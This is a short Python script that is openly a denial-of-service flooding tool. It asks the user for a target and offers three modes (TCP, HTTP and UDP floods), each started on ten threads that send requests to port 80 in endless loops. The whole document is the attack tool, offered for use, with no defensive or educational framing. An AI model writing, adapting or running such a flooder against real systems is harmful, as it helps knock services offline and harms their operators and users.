import socket
import threading
import requests

target_url = ''

def tcp_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_url, 80))
            s.sendall(b'GET / HTTP/1.1\r\nHost: ' + target_url.encode() + b'\r\n\r\n')
            s.close()
        except Exception as e:
            print("Error:", e)

def http_attack():
    while True:
        try:
            response = requests.get('http://' + target_url)
        except Exception as e:
            print("Error:", e)

def udp_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b'GET / HTTP/1.1\r\n', (target_url, 80))
            s.close()
        except Exception as e:
            print("Error:", e)

def start_attack(option):
    if option == 1:
        for _ in range(10):
            t = threading.Thread(target=tcp_attack)
            t.start()
    elif option == 2:
        for _ in range(10):
            t = threading.Thread(target=http_attack)
            t.start()
    elif option == 3:
        for _ in range(10):
            t = threading.Thread(target=udp_attack)
            t.start()

if __name__ == '__main__':
    target_url = input("Enter the target URL: ")
    print("Select attack option:")
    print("1. TCP Attack")
    print("2. HTTP Attack")
    print("3. UDP Attack")
    option = int(input("Enter your choice: "))
    start_attack(option)
